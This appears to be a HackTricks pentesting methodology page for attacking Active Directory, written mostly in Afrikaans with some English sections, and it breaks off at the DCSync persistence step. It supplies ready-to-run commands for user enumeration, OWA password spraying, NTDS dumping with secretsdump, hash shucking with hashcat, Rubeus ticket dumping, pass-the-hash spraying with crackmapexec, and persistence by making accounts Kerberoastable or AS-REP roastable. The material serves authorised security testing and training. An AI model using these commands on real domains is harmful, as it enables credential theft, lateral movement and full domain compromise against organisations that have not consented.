# Active Directory Metodologie

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as 'n fundamentele tegnologie wat **netwerkadministrateurs** in staat stel om doeltreffend **domains**, **users**, en **objects** binne 'n netwerk te skep en te bestuur. Dit is ontwerp om te skaal en vergemaklik die organisering van 'n groot aantal gebruikers in hanteerbare **groups** en **subgroups**, terwyl **access rights** op verskeie vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie primêre lae: **domains**, **trees**, en **forests**. 'n **domain** bevat 'n versameling objekte, soos **users** of **devices**, wat 'n gedeelde databasis deel. **Trees** is groepe van hierdie domains wat deur 'n gedeelde struktuur verbind is, en 'n **forest** verteenwoordig die versameling van meerdere trees, verbind deur **trust relationships**, en vorm die boonste laag van die organisasiestruktuur. Spesifieke **access** en **communication rights** kan op elk van hierdie vlakke aangewys word.

Sleutelkonsepte binne **Active Directory** sluit in:

1. **Directory** – Bevat alle inligting oor Active Directory-objekte.
2. **Object** – Dui entiteite in die directory aan, insluitend **users**, **groups**, of **shared folders**.
3. **Domain** – Dien as 'n houer vir directory-objekte; meerdere domains kan binne 'n **forest** bestaan, elk met hul eie versameling objekte.
4. **Tree** – 'n Groepering van domains wat 'n gemeenskaplike root domain deel.
5. **Forest** – Die hoogste organisasievlak in Active Directory, saamgestel uit verskeie trees met **trust relationships** tussen hulle.

**Active Directory Domain Services (AD DS)** sluit 'n reeks dienste in wat krities is vir die sentraliseerde bestuur en kommunikasie binne 'n netwerk. Hierdie dienste bestaan uit:

1. **Domain Services** – Sentraliseer data-opberging en bestuur interaksies tussen **users** en **domains**, insluitend **authentication** en **search** funksionaliteit.
2. **Certificate Services** – Beheer die skep, verspreiding en bestuur van veilige **digital certificates**.
3. **Lightweight Directory Services** – Ondersteun directory-enabled toepassings deur die **LDAP protocol**.
4. **Directory Federation Services** – Verskaf **single-sign-on** vermoëns om users oor verskeie web-toepassings in een sessie te verifieer.
5. **Rights Management** – Help om kopiereg-beskermde materiaal te beveilig deur ongeskikte verspreiding en gebruik te beperk.
6. **DNS Service** – Krities vir die resolusie van **domain names**.

Vir 'n meer gedetaileerde verklaring kyk: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Om te leer hoe om 'n **AD** aan te val, moet jy die **Kerberos authentication process** baie goed verstaan.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Spiekbrief

Jy kan baie vinnig 'n oorsig kry van watter opdragte jy kan gebruik om 'n AD te enumere/ekspluateer by [https://wadcoms.github.io/](https://wadcoms.github.io).

> [!WARNING]
> Kerberos communication vereis 'n volledige qualified name (FQDN) om aksies uit te voer. As jy probeer om 'n masjien deur die IP-adres te bereik, **sal dit NTLM gebruik en nie Kerberos nie**.

## Recon Active Directory (No creds/sessions)

As jy net toegang tot 'n AD-omgewing het maar geen credentials/sessions nie, kan jy:

- **Pentest the network:**
- Scan die netwerk, vind masjiene en oop poorte en probeer om **vulnerabilities** te **exploit** of **extract credentials** daaruit (byvoorbeeld, [printers could be very interesting targets](ad-information-in-printers.md)).
- DNS-enumerasie kan inligting gee oor sleutelbedieners in die domain soos web, printers, shares, vpn, media, ens.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Kyk na die algemene [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) vir meer inligting oor hoe om dit te doen.
- **Check for null and Guest access on smb services** (dit sal nie op moderne Windows-weergawe werk nie):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 'n Meer gedetailleerde gids oor hoe om 'n SMB-bediener te enumere kan hier gevind word:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 'n Meer gedetailleerde gids oor hoe om LDAP te enumere kan hier gevind word (let **spesiale aandag aan anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Versamel credentials deur [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Kry toegang tot 'n host deur [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Versamel credentials deur **fake UPnP services** met **evil-S** bloot te stel (en **SDP**) (bv. https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Ekstraheer gebruikersname/namens uit interne dokumente, sosiale media, en dienste (hoofsaaklik web) binne die domain-omgewings en ook publiek beskikbare bronne.
- As jy die volle name van maatskappy-werkers vind, kan jy verskeie AD **username conventions** probeer ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Die mees algemene konvensies is: _NameSurname_, _Name.Surname_, _NamSur_ (3 letters van elk), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Kyk die [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) en [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) bladsye.
- **Kerbrute enum**: Wanneer 'n **invalid username is requested** sal die bediener reageer met die **Kerberos error** kode _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wat ons toelaat om te bepaal dat die gebruikersnaam ongeldig was. **Valid usernames** sal óf 'n **TGT in 'n AS-REP** response uitlok óf die fout _KRB5KDC_ERR_PREAUTH_REQUIRED_, wat aandui dat die gebruiker pre-authentication moet uitvoer.
- **No Authentication against MS-NRPC**: Gebruik auth-level = 1 (No authentication) teen die MS-NRPC (Netlogon) koppelvlak op domain controllers. Die metode roep die `DsrGetDcNameEx2` funksie nadat die MS-NRPC koppelvlak gebind is om te kyk of die gebruiker of rekenaar bestaan sonder enige credentials. Die [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool implementeer hierdie tipe enumerasie. Die navorsing kan gevind word [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

As jy een van hierdie bedieners in die netwerk vind, kan jy ook **user enumeration** daarteen uitvoer. Byvoorbeeld, jy kan die hulpmiddel [**MailSniper**](https://github.com/dafthack/MailSniper) gebruik:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Jy kan lyste van gebruikersname vind in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  en hierdie een ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Jy behoort egter die **name van die mense wat by die maatskappy werk** te hê van die recon-stap wat jy voorheen moes uitvoer. Met die naam en van kan jy die script [**namemash.py**](https://gist.github.com/superkojiman/11076951) gebruik om potensiële geldige gebruikersname te genereer.

### As jy een of meer gebruikersname ken

Ok, so jy weet jy het reeds 'n geldige gebruikersnaam maar geen wagwoorde... Probeer dan:

- [**ASREPRoast**](asreproast.md): As 'n gebruiker **nie die attribuut _DONT_REQ_PREAUTH_ het nie** kan jy **'n AS_REP message versoek** vir daardie gebruiker wat data sal bevat wat deur 'n afleiding van die gebruiker se wagwoord versleuteld is.
- [**Password Spraying**](password-spraying.md): Kom ons probeer die mees **algemene wagwoorde** met elkeen van die ontdekte gebruikers; dalk gebruik 'n gebruiker 'n swak wagwoord (hou die wagwoordbeleid in gedagte!).
- Neem kennis dat jy ook **spray OWA servers** kan gebruik om te probeer toegang tot die gebruikers se mail servers te kry.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Jy mag dalk sekere challenge **hashes** kan verkry om te kraak deur die poisoning van sekere protokolle op die **netwerk**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

As jy daarin geslaag het om die Active Directory te enumereer sal jy **meer e-posadresse en 'n beter begrip van die netwerk** hê. Jy mag in staat wees om NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) af te dwing om toegang tot die AD-omgewing te kry.

### NetExec workspace-gedrewe recon & relay houdingkontroles

- Use **`nxcdb` workspaces** om AD recon state per engagement te bewaar: `workspace create <name>` skep per-protocol SQLite DBs onder `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Skakel views met `proto smb|mssql|winrm` en lys versamelde secrets met `creds`. Verwyder sensitiewe data handmatig wanneer klaar: `rm -rf ~/.nxc/workspaces/<name>`.
- Vinnige subnet-ontdekking met **`netexec smb <cidr>`** toon **domain**, **OS build**, **SMB signing requirements**, en **Null Auth**. Lede wat `(signing:False)` wys is **relay-prone**, terwyl DCs dikwels signing vereis.
- Genereer **hostnames in /etc/hosts** direk vanaf NetExec-uitset om teiken te vergemaklik:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wanneer **SMB relay to the DC is blocked** deur signing, ondersoek steeds die **LDAP** posture: `netexec ldap <dc>` wys `(signing:None)` / weak channel binding. 'n DC met SMB signing required maar LDAP signing disabled bly 'n lewensvatbare **relay-to-LDAP** teiken vir misbruik soos **SPN-less RBCD**.

### Kliëntkantse printer credential leaks → bulk domain credential validation

- Printer/web UIs soms **embed masked admin passwords in HTML**. Om source/devtools te bekyk kan cleartext openbaar maak (bv., `<input value="<password>">`), wat Basic-auth toegang tot scan/print repositories moontlik maak.
- Retrieved print jobs kan **plaintext onboarding docs** bevat met per-user passwords. Hou paarings in lyn wanneer jy toets:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Om 'n rekening gekompromitteer te hê is 'n **groot stap om die hele domein te begin kompromitteer**, omdat jy dan die **Active Directory Enumeration:** kan begin.

Wat [**ASREPRoast**](asreproast.md) betref kan jy nou elke moontlike kwesbare gebruiker vind, en wat [**Password Spraying**](password-spraying.md) betref kan jy 'n **lys van alle gebruikersname** kry en probeer met die wagwoord van die gekompromitteerde rekening, leë wagwoorde en nuwe belowende wagwoorde.

- Jy kan die [**CMD om 'n basiese recon uit te voer**](../basic-cmd-for-pentesters.md#domain-info) gebruik
- Jy kan ook [**powershell for recon**](../basic-powershell-for-pentesters/index.html) gebruik wat minder sigbaar sal wees
- Jy kan ook [**use powerview**](../basic-powershell-for-pentesters/powerview.md) om meer gedetailleerde inligting te onttrek
- Nog 'n uitstekende hulpmiddel vir recon in 'n active directory is [**BloodHound**](bloodhound.md). Dit is **nie baie stealthy** nie (afhangend van die versamelmetodes wat jy gebruik), maar **as dit jou nie pla nie**, behoort jy dit beslis te probeer. Vind waar gebruikers kan RDP, vind paaie na ander groups, ens.
- **Ander geoutomatiseerde AD enumerasie instrumente is:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) aangesien dit interessante inligting kan bevat.
- 'n **Tool met GUI** wat jy kan gebruik om die directory te enumereer is **AdExplorer.exe** van die **SysInternal** Suite.
- Jy kan ook in die LDAP-databasis soek met **ldapsearch** om te kyk vir credentials in velde _userPassword_ & _unixUserPassword_, of selfs in _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) vir ander metodes.
- As jy **Linux** gebruik, kan jy die domein ook enumereer met [**pywerview**](https://github.com/the-useless-one/pywerview).
- Jy kan ook geoutomatiseerde gereedskap probeer soos:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Dit is baie maklik om al die domein-gebruikersname van Windows te kry (`net user /domain` ,`Get-DomainUser` of `wmic useraccount get name,sid`). In Linux kan jy gebruik: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` of `enum4linux -a -u "user" -p "password" <DC IP>`

> Selfs al lyk hierdie Enumerasie afdeling kort, dit is die belangrikste deel van alles. Gaan deur die skakels (veral dié van cmd, powershell, powerview en BloodHound), leer hoe om 'n domein te enumereer en oefen totdat jy gemaklik voel. Tydens 'n assessment sal dit die sleutel oomblik wees om jou pad na DA te vind of te besluit dat niks gedoen kan word nie.

### Kerberoast

Kerberoasting behels die bekom van **TGS tickets** wat deur dienste gebruik word wat aan gebruikersrekeninge gekoppel is en die kraak van hul enkripsie — wat gebaseer is op gebruikerswagwoorde — **offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Sodra jy sekere credentials bekom het kan jy kyk of jy toegang tot enige **machine** het. Hiervoor kan jy **CrackMapExec** gebruik om te probeer verbind op verskeie servers met verskillende protokolle, ooreenkomstig jou poortskanderings.

### Local Privilege Escalation

As jy gekompromitteerde credentials of 'n sessie het as 'n gewone domeingebruiker en jy het **toegang** met hierdie gebruiker tot **enige masjien in die domein**, behoort jy te probeer om plaaslik privilegies te eskaleer en na credentials te loer. Slegs met plaaslike administrateurprivileges sal jy hashes van ander gebruikers in geheue (LSASS) en plaaslik (SAM) kan dump.

Daar is 'n volledige bladsy in hierdie boek oor [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) en 'n [**checklist**](../checklist-windows-privilege-escalation.md). Ook, moenie vergeet om [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) te gebruik nie.

### Current Session Tickets

Dit is baie **onwaarskynlik** dat jy **tickets** in die huidige gebruiker sal vind wat jou **toestemming gee om toegang** tot onverwagte bronne te kry, maar jy kan dit nagaan:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Nou dat jy sommige basiese credentials het, moet jy kyk of jy enige **interessante lêers wat binne die AD gedeel word** kan **vind**. Jy kan dit met die hand doen, maar dit is 'n baie vervelige herhalende taak (veral meer as jy honderde dokumente vind wat jy moet nagaan).

[**Volg hierdie skakel om te leer oor gereedskap wat jy kan gebruik.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

As jy toegang tot ander PCs of shares kan kry, kan jy **lêers plaas** (soos 'n SCF-lêer) wat, indien dit op een of ander manier geopen word, 'n **NTLM authentication against you** sal **trigger** sodat jy die **NTLM challenge** kan **steel** om dit te kraak:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie kwesbaarheid het enige geverifieerde gebruiker toegelaat om die **domain controller te kompromitteer**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopelik het jy daarin geslaag om 'n **plaaslike admin** rekening te kompromitteer deur gebruik te maak van [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) (insluitend relaying), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).  
Dan is dit tyd om al die hashes in geheue en plaaslik te onttrek.  
[**Lees hierdie bladsy oor verskillende maniere om die hashes te bekom.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.  
Jy moet 'n **tool** gebruik wat die **NTLM authentication using** daardie **hash** sal uitvoer, **of** jy kan 'n nuwe **sessionlogon** skep en daardie **hash** in **LSASS** **inject**, sodat wanneer enige **NTLM authentication is performed**, daardie **hash** gebruik sal word. Die laaste opsie is wat mimikatz doen.  
[**Lees hierdie bladsy vir meer inligting.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Hierdie aanval poog om die **user NTLM hash te gebruik om Kerberos tickets aan te vra**, as 'n alternatief tot die algemene Pass The Hash oor NTLM-protokol. Dit kan veral **nuttig wees in netwerke waar NTLM protocol is disabled** en slegs **Kerberos is allowed** as verifikasieprotokol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In die **Pass The Ticket (PTT)** aanvalmetode steel aanvallers 'n gebruiker se **authentication ticket** in plaas van hul wagwoord of hash-waardes. Hierdie gesteelde kaartjie word dan gebruik om die gebruiker te **impersonate**, en sodoende ongemagtigde toegang tot hulpbronne en dienste binne 'n netwerk te verkry.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

As jy die **hash** of **password** van 'n **local administrato**r het, moet jy probeer om **lokale login** by ander **PCs** daarmee te doen.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Let wel dat dit redelik **luidrugtig** is en dat **LAPS** dit sou **verminder**.

### MSSQL Abuse & Trusted Links

As 'n gebruiker voorbeelde van MSSQL kan toegang hê tot, kan hy dit gebruik om **opdragte uit te voer** op die MSSQL-gasheer (as dit as SA loop), die NetNTLM **hash** te **steel** of selfs 'n **relay** **attack** uit te voer.\
Ook, as 'n MSSQL-instansie vertrou word (database link) deur 'n ander MSSQL-instansie en die gebruiker het voorregte oor die vertroude databasis, sal hy in staat wees om **die vertrouensverhouding te gebruik om ook navrae in die ander instansie uit te voer**. Hierdie vertroue kan gekoppel word en op 'n punt mag die gebruiker 'n verkeerd gekonfigureerde databasis kry waar hy opdragte kan uitvoer.\
**Die skakels tussen databasisse werk selfs oor forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Derdes se inventory- en ontplooiingsuite openbaar dikwels kragtige paaie na credentials en code-uitvoering. Sien:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

As jy enige Computer-object vind met die attribuut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) en jy het domeinvoorregte op die rekenaar, sal jy in staat wees om TGTs uit die geheue van alle gebruikers wat op die rekenaar aanmeld, te dump.\
Dus, as 'n **Domain Admin aanmeld op die rekenaar**, sal jy sy TGT kan dump en hom kan impersonate gebruikende [Pass the Ticket](pass-the-ticket.md).\
Danksy constrained delegation kan jy selfs **outomaties 'n Print Server kompromitteer** (hopelik sal dit 'n DC wees).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

As 'n gebruiker of rekenaar vir "Constrained Delegation" toegelaat word, sal dit in staat wees om **enige gebruiker te impersonate om toegang tot sekere dienste op 'n rekenaar te kry**.\
Indien jy die **hash van hierdie gebruiker/rekenaar kompromitteer**, sal jy in staat wees om **enige gebruiker te impersonate** (selfs domain admins) om toegang tot sommige dienste te kry.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Om **WRITE**-voorregte op 'n Active Directory-objek van 'n afgeleë rekenaar te hê, maak dit moontlik om kode-uitvoering met **verhoogde voorregte** te bereik:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Die gekompromitteerde gebruiker kan sommige **interessante voorregte oor sekere domeinobjekte** hê wat jou kan toelaat om lateraal te **beweeg**/**voorregte op te bou**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Om 'n **Spool service wat luister** binne die domein te ontdek kan **misbruik** word om **nuwe credentials te bekom** en **voorregte op te bou**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

As **ander gebruikers** die **gekompromitteerde** masjien **toegang** kry, is dit moontlik om **credentials uit die geheue te versamel** en selfs **beacons in hul prosesse te inject** om hulle te impersonate.\
Gewoonlik gaan gebruikers die stelsel via RDP toegang, so hier is hoe om 'n paar aanvalle teen derdeparty RDP-sessies uit te voer:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bied 'n stelsel vir die bestuur van die **lokale Administrator-wagwoord** op domain-joined rekenaars, en verseker dat dit **gerandomiseer**, uniek en gereeld **verander** word. Hierdie wagwoorde word in Active Directory gestoor en toegang word deur ACLs tot gemagtigde gebruikers beheer. Met voldoende permissies om hierdie wagwoorde te lees, word pivoting na ander rekenaars moontlik.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Versameling van certificates** van die gekompromitteerde masjien kan 'n manier wees om voorregte binne die omgewing op te bou:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

As **kwetsbare templates** gekonfigureer is, is dit moontlik om hulle te misbruik om voorregte op te bou:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sodra jy **Domain Admin** of nog beter **Enterprise Admin**-voorregte kry, kan jy die **domeindatabasis** dump: _ntds.dit_.

[**Meer inligting oor die DCSync attack kan hier gevind word**](dcsync.md).

[**Meer inligting oor hoe om NTDS.dit te steel kan hier gevind word**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Sommige van die tegnieke wat voorheen bespreek is, kan vir persistentie gebruik word.\
Byvoorbeeld, jy kan:

- Maak gebruikers kwesbaar vir [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Maak gebruikers kwesbaar vir [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Gee [**DCSync**](#dcsync) voorregte aan 'n gebruiker

```bash
